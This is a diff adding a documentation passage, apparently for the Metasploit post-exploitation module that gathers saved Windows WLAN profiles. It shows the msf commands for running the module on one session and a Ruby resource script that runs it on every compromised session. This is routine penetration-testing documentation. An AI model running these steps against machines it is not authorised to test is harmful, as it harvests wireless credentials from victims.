@@ -1,0 +1,24 @@
+The second is by using the "use" command at the msf prompt. You will have to figure out which session ID to set manually. To list all session IDs, you can use the "sessions" command.
+
+msf > use post/windows/wlan/wlan_profile
+msf post(wlan_profile) > show options
+    ... show and set options ...
+msf post(wlan_profile) > set SESSION session-id
+msf post(wlan_profile) > exploit
+
+
+If you wish to run the post against all sessions from framework, here is how:
+
+
+1 - Create the following resource script:
+
+framework.sessions.each_pair do |sid, session|
+  run_single("use post/windows/wlan/wlan_profile")
+  run_single("set SESSION #{sid}")
+  run_single("run")
+end
+
+
+2 - At the msf prompt, execute the above resource script:
+
+msf > resource path-to-resource-script
